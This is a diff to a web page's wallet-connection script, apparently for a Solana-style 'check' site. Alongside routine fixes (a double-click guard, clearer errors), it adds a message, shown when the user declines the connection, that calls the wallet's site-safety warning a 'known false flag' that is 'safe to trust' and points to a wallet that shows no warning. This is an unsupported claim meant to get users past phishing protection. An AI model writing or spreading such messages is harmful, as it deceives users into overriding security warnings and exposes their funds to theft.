@@ -238,10 +238,13 @@ function syncWalletUi() {
     document.getElementById('results').innerHTML = '';
   }
 }
+let connecting = false;
 async function connectWallet(id) {
+  if (connecting) return;            // ignore double-taps while a prompt is open
   const w = WALLETS[id];
   const provider = w && w.detect();
-  if (!provider) { showError(`${w ? w.name : 'Wallet'} not detected. Install it and refresh.`); return; }
+  if (!provider) { showError(`${w ? w.name : 'Wallet'} not detected. Open this page in ${w ? w.name : 'the wallet'}'s in-app browser, or install the extension.`); return; }
+  connecting = true;
   try {
     const resp = await provider.connect();
     const pk = resp?.publicKey?.toString?.() || provider.publicKey?.toString?.();
@@ -250,7 +253,16 @@ async function connectWallet(id) {
     activeWallet = { id, provider };
     syncWalletUi();
     scan();   // auto-run the check on connect
-  } catch (e) { showError(`${w.name} connection failed: ${e.message || e}`); }
+  } catch (e) {
+    const code = e && e.code;
+    if (code === 4001 || code === 4100 || /not been authorized|rejected/i.test((e && e.message) || '')) {
+      showError(`${w.name} didn't authorize the connection. Approve the connect popup — if you see a site-safety warning, it's a known false flag under review, safe to trust. Solflare connects without the warning.`);
+    } else {
+      showError(`${w.name} connection failed: ${e.message || e}`);
+    }
+  } finally {
+    connecting = false;
+  }
 }
 function disconnectWallet() {
   try { activeWallet?.provider?.disconnect?.(); } catch (e) {}
